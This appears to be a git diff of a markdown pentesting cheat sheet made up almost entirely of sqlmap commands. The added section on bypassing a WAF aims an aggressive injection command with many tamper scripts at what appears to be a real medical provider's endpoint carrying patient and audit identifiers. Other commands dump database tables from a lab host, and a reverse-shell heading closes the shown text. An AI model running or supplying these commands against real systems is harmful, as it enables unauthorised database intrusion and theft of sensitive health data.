@@ -151,17 +151,22 @@ sqlmap -u 'http://demo.ine.local/index.php?page=login.php' --data="username=ss&p
 
 ```
 
+## Attempts to bypass a WAF
 
-# Dump a specific table
-
-```shell
-sqlmap -u 'http://demo.ine.local/index.php?page=login.php' --data="username=ss&password=ss&login-php-submit-button=Login" -p username --banner --current-db --dump -T table --threads 10
+```bash
+sqlmap -u 'https://cosabog06xz036.colmedica.com/COAP09/Sahos/IniciarAuditoria?idPaciente=70753&numeroContrat
+o=F239103557348CC0035335123&idAuditoria=0&editarAuditoria=
+False' -p idPaciente --threads 10 --cookie="cookie=value" --level=2 --risk=3 --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,
+equaltolike,greatest,ifnull2ifisnull,multiplespaces,percentage,randomcase,space2comment,space2plus,space2randomblank,
+unionalltounion,unmagicquotes
 ```
 
-# Dump a specific table from a database
-```shell
-sqlmap -u 'http://demo.ine.local/index.php?page=login.php' --data="username=ss&password=ss&login-php-submit-button=Login" -p username --banner -D database --dump -T table --threads 10
+Additional parameters can be
+
+```bash
+--code=HTTPCode --no-cast --no-escape
 ```
+
 ## Setting cookie values
 
 ```bash
@@ -174,6 +179,17 @@ The cookie parameter can be filled with the HTTP Cookie header value from valid 
 
 ```shell
 sqlmap -r req.txt -p parameter
+```
+
+## Dump a specific table
+
+```shell
+sqlmap -u 'http://demo.ine.local/index.php?page=login.php' --data="username=ss&password=ss&login-php-submit-button=Login" -p username --banner --current-db --dump -T table --threads 10
+```
+
+## Dump a specific table from a given database
+```shell
+sqlmap -u 'http://demo.ine.local/index.php?page=login.php' --data="username=ss&password=ss&login-php-submit-button=Login" -p username --banner -D database --dump -T table --threads 10
 ```
 
 # Simple Linux reverse shell
